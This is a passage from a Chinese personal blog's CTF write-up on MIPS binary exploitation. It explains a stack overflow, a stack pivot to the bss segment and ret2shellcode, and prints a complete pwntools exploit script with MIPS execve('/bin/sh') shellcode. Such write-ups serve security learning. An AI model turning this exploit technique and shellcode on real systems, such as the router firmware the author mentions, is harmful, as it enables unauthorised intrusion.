  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>auStack64<span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>c</code></pre>
<p>read读入的字节数大于缓冲区的大小，造成溢出</p>
<p>注意到存在一个<strong>backdoor</strong>函数，查看一下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"how are you?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>并没有什么🥚用，只是提供了一个system函数</p>
<p>IDA使用mipsrop查找一下gadget</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/27.jpg" alt></p>
<p>虽然是静态编译，但可用的gadget非常少</p>
<p>而用于栈的gadget只有一条，还是为$a1赋值</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/28.jpg" alt></p>
<p>所以我们得换个思路，gadget不足，不能用rop来getshell，但程序没有NX保护，所以我们便采用ret2shellcode来利用</p>
<p>首先确定一下偏移量大小</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/29.jpg" alt></p>
<p>glibcpwn中，ret2shellcode有时会利用read函数往bss端读入shellcode然后跳转到bss段执行，这题的利用手法也类似，不过在这题中，我们并不能手动构造出read函数，而是借用vul函数中的read语句来执行，如下所示</p>
<pre class=" language-assembly"><code class="language-assembly">.text:00400484                 li      $a2, 0xB0
.text:00400488                 addiu   $v0, $fp, 0x58+var_40
.text:0040048C                 move    $a1, $v0
.text:00400490                 move    $a0, $zero
.text:00400494                 la      $v0, read
.text:00400498                 move    $t9, $v0
.text:0040049C                 bal     read</code></pre>
<p>注意到read函数的第二个参数，也就是读入的地址来源于$v0,而$v0又来源于$fp+0x58-0x40，继续往下看到vul函数结束的语句</p>
<pre class=" language-assembly"><code class="language-assembly">.text:004004B0                 lw      $ra, 0x58+var_4($sp)
.text:004004B4                 lw      $fp, 0x58+var_8($sp)
.text:004004B8                 addiu   $sp, 0x58
.text:004004BC                 jr      $ra</code></pre>
<p>vul函数结束时会还原栈帧，main函数的$fp的值会存在$ra的上方，函数结束时会将其取出放入$fp中，因此我们可以控制$fp的值，再将$ra覆盖为read功能开始处，也就是0x00400484，这样我们就能将shellcode写入别的位置，再将返回地址覆盖为shellcode写入的位置，返回后就会执行shellcode</p>
<p>先贴上exp</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span>
<span class="token comment" spellcheck="true">#io = process(['./qemu-mipsel', '-g','1234', './pwn2'])</span>
<span class="token comment" spellcheck="true">#io=remote('xmctf.top',8905)</span>
io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn2'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"what is your name?\n"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'just do it~'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#shellcode = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>
<span class="token comment" spellcheck="true">#shellcode = "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00"</span>
shellcode<span class="token operator">=</span><span class="token string">"\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh"</span> 
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
read <span class="token operator">=</span> <span class="token number">0x400484</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">56</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">0x58</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">60</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> shellcode

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>由于偏移量为60，那么相对于fp就为56，我们的目标是往bss段写入shellcode，为避免bss开头存在某些值，选择往bss+0x50处写入shellcode</p>
<pre class=" language-assembly"><code class="language-assembly">addiu   $v0, $fp, 0x58+var_40</code></pre>
<p>因为是将<strong>$fp+0x58-0x40</strong>赋给$v0,为避免计算，我们将$fp设置为<strong>bss+0x50-0x58+0x40</strong>,这样赋给$v0的就是<strong>(bss+0x50-0x58+0x40)+0x58-0x40=bss+0x50</strong>，随后sleep(1),等待rop执行，接着就会执行第二次read，往bss+0x50读，实际上这就是一个栈迁移，将栈迁移到了bss段，这次就只需要覆盖$ra，将$ra修改为shellcode的地址。第二次read从bss+0x50开始，然后写入60(0x3c)个A，返回地址占四字节，加起来就是0x40个字节，返回地址之后就是shellcode，所以将返回地址修改为<strong>bss+0x50+0x40</strong>就好</p>
<p>执行效果如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/30.jpg" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        这三道题相信在做多了glibcpwn的师傅们看来都是基础题，需要注意的就是mips架构下的指令和寄存器的功能，以及叶子函数和非叶子函数的一点区别。不过在跟着《解密家用路由器0day漏洞挖掘技术》这本书进行一些路由器漏洞的复现时，发觉挺多路由器漏洞的利用难度也差不多是这个水平(当然也不能局限于这个难度，难题也还是有的)，路由器绝大部分无aslr，固件无保护，困难之处在于发现漏洞。当然也可能是因为我接触的少了，这本书上的几个漏洞也都是好几年前的了，现在的情况也应该有所变化。</p>
<p>​        最后，希望本篇文章能为像我一样刚入门的师傅们提供一点帮助。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.root-me.org/en/Challenges/App-System/" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/App-System/</a></li>
<li><a href="https://www.cnblogs.com/hac425/p/9416864.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416864.html</a></li>
<li><a href="https://blog.csdn.net/seaaseesa/article/details/105281585" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105281585</a></li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Lock</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="http://lawlietlw.github.io/2020/08/04/lock-mipspwn-xue-xi/">http://lawlietlw.github.io/2020/08/04/lock-mipspwn-xue-xi/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://LawlietLW.github.io">Lock's blog</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/"><i class="fas fa-angle-left">&nbsp;</i><span>IO_FILE学习</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/"><span>VMpwn学习</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2019 ～ 2020 By Lock</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/highlight.js"></script><!--script(src=url)--></body></html>